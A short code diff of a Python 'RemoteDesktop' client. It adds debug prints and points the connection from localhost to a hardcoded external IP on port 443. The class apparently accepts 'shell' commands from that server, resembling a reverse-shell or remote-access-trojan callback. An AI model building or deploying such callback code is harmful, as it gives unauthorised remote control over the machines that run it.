@@ -84,6 +84,7 @@ class RemoteDesktop:
     
     def recv_msg(self):
         data = self.recv().decode()
+        print(data)
         if data.startswith("shell"):
             data = data.split(":", 1)
         elif data == "STOP":
@@ -93,6 +94,7 @@ class RemoteDesktop:
         return data
 
     def send(self, data):
+        print(struct.pack('>I', len(data)) + data)
         self.socket.send(struct.pack('>I', len(data)) + data)
 
     def upload(self, data):
@@ -230,7 +232,7 @@ class RemoteDesktop:
 
 def main():
     global connected
-    remote = RemoteDesktop("localhost", 443)
+    remote = RemoteDesktop("146.190.39.1", 443)
     while not remote.active:
         if not connected:
             try:
